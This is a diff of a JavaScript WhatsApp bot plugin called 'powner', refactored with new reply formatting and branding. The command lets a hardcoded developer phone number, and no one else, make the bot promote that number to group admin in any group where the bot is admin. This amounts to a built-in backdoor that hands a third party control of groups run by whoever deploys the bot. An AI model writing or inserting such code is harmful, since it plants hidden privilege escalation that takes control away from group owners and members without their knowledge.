@@ -1,5 +1,8 @@
+
 import { getFakeQuoted } from '../../lib/fakeQuoted.js';
-const DEVELOPER_NUMBER = "255752593977";
+
+const DEVELOPER_NUMBER = '255752593977';
+const BOT_NAME = 'SHADOW FMD';
 
 const normalizeNumber = (jid) => {
     if (!jid) return '';
@@ -7,10 +10,12 @@ const normalizeNumber = (jid) => {
 };
 
 const findDevInGroup = (participants) => {
+    const devNum = normalizeNumber(DEVELOPER_NUMBER);
+
     return participants.find(p => {
         const idNum = normalizeNumber(p.id || '');
         const jidNum = normalizeNumber(p.jid || '');
-        const devNum = normalizeNumber(DEVELOPER_NUMBER);
+
         return idNum === devNum || jidNum === devNum;
     });
 };
@@ -23,12 +28,18 @@ const getActualJid = (member) => {
 const retryPromote = async (client, groupId, participant, maxRetries = 5, baseDelay = 1500) => {
     for (let attempt = 1; attempt <= maxRetries; attempt++) {
         try {
-            await client.sendMessage(m.chat, { react: { text: '⌛', key: m.reactKey } });
-            await client.groupParticipantsUpdate(groupId, [participant], "promote");
+            await client.groupParticipantsUpdate(
+                groupId,
+                [participant],
+                'promote'
+            );
             return true;
-        } catch (e) {
-            if (attempt === maxRetries) throw e;
-            await new Promise(resolve => setTimeout(resolve, baseDelay * Math.pow(2, attempt - 1)));
+        } catch (error) {
+            if (attempt === maxRetries) throw error;
+
+            await new Promise(resolve =>
+                setTimeout(resolve, baseDelay * Math.pow(2, attempt - 1))
+            );
         }
     }
 };
@@ -36,26 +47,53 @@ const retryPromote = async (client, groupId, participant, maxRetries = 5, baseDe
 export default {
     name: 'powner',
     aliases: ['promoteowner', 'makeowneradmin'],
-    description: 'Promotes the owner to admin',
+    description: 'Promotes the developer to group admin',
+
     run: async (context) => {
         const { client, m, isBotAdmin } = context;
         const fq = getFakeQuoted(m);
-        await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } });
+
+        const react = async (emoji) => {
+            await client.sendMessage(m.chat, {
+                react: { text: emoji, key: m.reactKey }
+            }).catch(() => {});
+        };
+
+        const replyBox = (title, message) => {
+            return `╭━━━「 🟢 ${BOT_NAME} 」━━━╮
+├ ${title}
+├
+├ ${message}
+╰━━━━━━━━━━━━━━━━━━╯
+> ⚡ POWERED BY ${BOT_NAME}`;
+        };
+
+        await react('⌛');
 
         if (!m.isGroup) {
-            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
-            return m.reply(`╭━━━ᕙ    ᖴᗴᗴ-᙭ᗰᗪツ    ᕗ━━━\n├ \n├ This command only works in groups.\n╰━━━━━━━━━━━━━━━━ᕗ\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝖋𝖗𝖊𝖉𝖎_𝖊𝖟𝖗𝖆`);
+            await react('❌');
+            return m.reply(replyBox(
+                'GROUP ONLY',
+                'This command only works in groups.'
+            ));
         }
 
         const senderNum = normalizeNumber(m.sender);
+
         if (senderNum !== normalizeNumber(DEVELOPER_NUMBER)) {
-            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
-            return m.reply(`╭━━━ᕙ    ᖴᗴᗴ-᙭ᗰᗪツ    ᕗ━━━\n├ \n├ Only the owner can use this command.\n╰━━━━━━━━━━━━━━━━ᕗ\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝖋𝖗𝖊𝖉𝖎_𝖊𝖟𝖗𝖆`);
+            await react('❌');
+            return m.reply(replyBox(
+                'ACCESS DENIED',
+                'Only the developer can use this command.'
+            ));
         }
 
         if (!isBotAdmin) {
-            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
-            return m.reply(`╭━━━ᕙ    ᖴᗴᗴ-᙭ᗰᗪツ    ᕗ━━━\n├ \n├ I need admin privileges to\n├ perform this action.\n╰━━━━━━━━━━━━━━━━ᕗ\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝖋𝖗𝖊𝖉𝖎_𝖊𝖟𝖗𝖆`);
+            await react('❌');
+            return m.reply(replyBox(
+                'ADMIN REQUIRED',
+                'I need admin privileges to perform this action.'
+            ));
         }
 
         try {
@@ -63,23 +101,39 @@ export default {
             const ownerMember = findDevInGroup(groupMetadata.participants);
 
             if (!ownerMember) {
-                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
-                return m.reply(`╭━━━ᕙ    ᖴᗴᗴ-᙭ᗰᗪツ    ᕗ━━━\n├ \n├ Owner is not in this group.\n╰━━━━━━━━━━━━━━━━ᕗ\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝖋𝖗𝖊𝖉𝖎_𝖊𝖟𝖗𝖆`);
+                await react('❌');
+                return m.reply(replyBox(
+                    'NOT FOUND',
+                    'Developer is not in this group.'
+                ));
             }
 
             if (ownerMember.admin) {
-                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
-                return m.reply(`╭━━━ᕙ    ᖴᗴᗴ-᙭ᗰᗪツ    ᕗ━━━\n├ \n├ Owner is already an admin.\n╰━━━━━━━━━━━━━━━━ᕗ\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝖋𝖗𝖊𝖉𝖎_𝖊𝖟𝖗𝖆`);
+                await react('ℹ️');
+                return m.reply(replyBox(
+                    'ALREADY ADMIN',
+                    'Developer is already a group admin.'
+                ));
             }
 
             const actualJid = getActualJid(ownerMember);
+
             await retryPromote(client, m.chat, actualJid);
-            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
-            return m.reply(`╭━━━ᕙ    ᖴᗴᗴ-᙭ᗰᗪツ    ᕗ━━━\n├━━━≫ PROMOTED ≪━━━\n├ \n├ Owner has been promoted to admin.\n╰━━━━━━━━━━━━━━━━ᕗ\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝖋𝖗𝖊𝖉𝖎_𝖊𝖟𝖗𝖆`);
+
+            await react('✅');
+
+            return m.reply(replyBox(
+                'PROMOTED SUCCESSFULLY',
+                'Developer has been promoted to group admin.'
+            ));
 
         } catch (error) {
-    await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
-            return m.reply(`╭━━━ᕙ    ᖴᗴᗴ-᙭ᗰᗪツ    ᕗ━━━\n├━━━≫ ERROR ≪━━━\n├ \n├ Failed to promote: ${error.message}\n╰━━━━━━━━━━━━━━━━ᕗ\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝖋𝖗𝖊𝖉𝖎_𝖊𝖟𝖗𝖆`);
+            await react('❌');
+
+            return m.reply(replyBox(
+                'ERROR',
+                `Failed to promote: ${error.message}`
+            ));
         }
     }
 };
